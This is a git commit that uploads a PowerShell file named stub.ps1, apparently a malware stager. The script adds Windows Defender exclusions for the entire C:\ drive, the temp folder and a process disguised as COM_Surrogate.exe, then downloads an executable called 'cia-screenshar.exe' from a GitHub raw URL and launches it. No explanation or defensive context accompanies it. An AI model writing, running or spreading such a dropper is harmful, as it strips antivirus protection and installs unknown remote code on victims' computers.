fb5858356a7562a913f9c72fbfa78f63318c7302
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-03-05 15:05:05 -0800

    Add files via upload

---
+++ files/stub.ps1
@@ -0,0 +1,16 @@
+Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "$env:temp"
+Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
+Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
+Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
+$url = "https://raw.githubusercontent.com/M7mmdddd/psps/refs/heads/main/cia-screenshar.exe"
+
+ $output = "$env:TEMP\cia-screenshar.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $output
+
+if (Test-Path $output) {
+    Start-Process -FilePath $output
+} else {
+    Write-Host "Failed to download the file."
+}
